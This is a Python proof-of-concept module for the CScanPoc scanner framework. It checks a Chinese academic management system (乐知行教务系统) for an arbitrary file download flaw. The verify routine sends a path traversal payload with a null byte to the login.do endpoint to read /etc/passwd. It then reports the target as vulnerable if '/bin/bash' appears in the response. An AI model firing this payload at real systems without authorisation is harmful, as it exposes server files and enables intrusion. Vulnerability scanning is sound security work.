# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '11aea793-aad0-4647-bde1-612a3fecaf41'
    name = '北京乐知行教务系统 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2015-08-08'  # 漏洞公布时间
    desc = '''
        北京乐知行教务系统 /datacenter/global/login.do?bg=../../../../../../../etc/passwd%00 存在任意文件下载漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '乐知行教务系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '081b075f-b73a-4290-83bc-cb7f02ab24cc'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #Refer http://www.wooyun.org/bugs/wooyun-2010-0132070
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = '/datacenter/global/login.do?bg=../../../../../../../etc/passwd%00'
            url = arg + payload
            code, head, res, errcode, _url = hh.http(url)
            if code == 200 and '/bin/bash' in res: 
                #security_hole(url) 
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
